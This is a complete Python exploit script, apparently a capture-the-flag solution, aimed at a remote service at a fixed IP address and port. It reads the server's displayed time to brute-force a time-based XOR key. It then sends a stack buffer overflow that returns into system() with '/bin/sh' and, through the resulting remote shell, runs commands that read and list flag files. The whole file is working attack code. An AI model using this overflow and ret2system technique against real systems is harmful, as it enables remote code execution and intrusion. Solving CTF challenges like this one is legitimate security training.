#!/usr/bin/env python3
import re
import socket
import struct
import time
from datetime import datetime, timedelta, timezone

HOST = "143.198.163.4"
PORT = 3000
SYSTEM_PLT = 0x080490B0
BINSH = 0x0804A018

TIME_MARK = b"Currently the time is: "
FLAG_RE = re.compile(rb"texsaw\{[^\n\r}]*\}")


def p32(x: int) -> bytes:
    return struct.pack("<I", x & 0xFFFFFFFF)


def recv_until(sock: socket.socket, marker: bytes, max_bytes: int = 8192) -> bytes:
    data = b""
    while marker not in data and len(data) < max_bytes:
        chunk = sock.recv(1024)
        if not chunk:
            break
        data += chunk
    return data


def recv_time_banner(sock: socket.socket, max_bytes: int = 8192) -> bytes:
    data = b""
    while len(data) < max_bytes:
        chunk = sock.recv(1024)
        if not chunk:
            break
        data += chunk
        idx = data.find(TIME_MARK)
        if idx != -1:
            line_end = data.find(b"\n", idx)
            if line_end != -1:
                return data[: line_end + 1]
    return data


def xor_encode(desired: bytes, start_key: int) -> bytes:
    out = bytearray()
    for i, b in enumerate(desired):
        k = (start_key + (i // 4)) & 0xFFFFFFFF
        kb = (k >> (8 * (i % 4))) & 0xFF
        out.append(b ^ kb)
    return bytes(out)


def parse_ctime_line(blob: bytes) -> datetime:
    idx = blob.find(TIME_MARK)
    if idx == -1:
        raise ValueError("time marker not found")
    rest = blob[idx + len(TIME_MARK):]
    line = rest.split(b"\n", 1)[0].decode(errors="ignore").strip()
    # Example: Sat Mar 28 22:46:00 2026
    return datetime.strptime(line, "%a %b %d %H:%M:%S %Y")


def build_candidates(dt: datetime):
    # Assume printed time is UTC first (common for CTF infra), then sweep timezone offsets.
    # time() value used by the binary is epoch, then rounded down to minute.
    candidates = []

    # prioritize UTC assumption
    utc_epoch = int(dt.replace(tzinfo=timezone.utc).timestamp())
    base = utc_epoch - (utc_epoch % 60)
    for dm in [0, -1, 1, -2, 2]:
        candidates.append((base + 60 * dm) & 0xFFFFFFFF)

    # fallback: brute timezone offsets from -12h to +14h
    for off in range(-12, 15):
        tz_epoch = int((dt - timedelta(hours=off)).replace(tzinfo=timezone.utc).timestamp())
        tz_base = tz_epoch - (tz_epoch % 60)
        for dm in [0, -1, 1]:
            k = (tz_base + 60 * dm) & 0xFFFFFFFF
            if k not in candidates:
                candidates.append(k)

    return candidates


def try_once(start_key: int, timeout: float = 3.0):
    payload_plain = b"A" * 68 + p32(SYSTEM_PLT) + p32(0x41414141) + p32(BINSH)
    payload = xor_encode(payload_plain, start_key)

    with socket.create_connection((HOST, PORT), timeout=timeout) as s:
        s.settimeout(timeout)

        banner = recv_time_banner(s)

        # send crafted payload
        s.sendall(payload)

        # Give /bin/sh a tiny moment, then request the flag.
        time.sleep(0.15)
        s.sendall(b"cat flag.txt 2>/dev/null; cat /flag 2>/dev/null; ls; exit\n")

        data = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass

    m = FLAG_RE.search(data)
    return (m.group(0).decode() if m else None), banner, data


def main():
    # First connection only to parse server displayed time.
    with socket.create_connection((HOST, PORT), timeout=3.0) as s:
        s.settimeout(3.0)
        banner = recv_time_banner(s)

    dt = parse_ctime_line(banner)
    candidates = build_candidates(dt)

    for i, k in enumerate(candidates, 1):
        try:
            flag, _, data = try_once(k)
            if flag:
                print(flag)
                return
            if b"flag" in data.lower():
                print(data.decode(errors="ignore"))
                return
        except Exception:
            continue

    print("Exploit attempts finished, no flag found. Try rerun near minute boundary.")


if __name__ == "__main__":
    main()
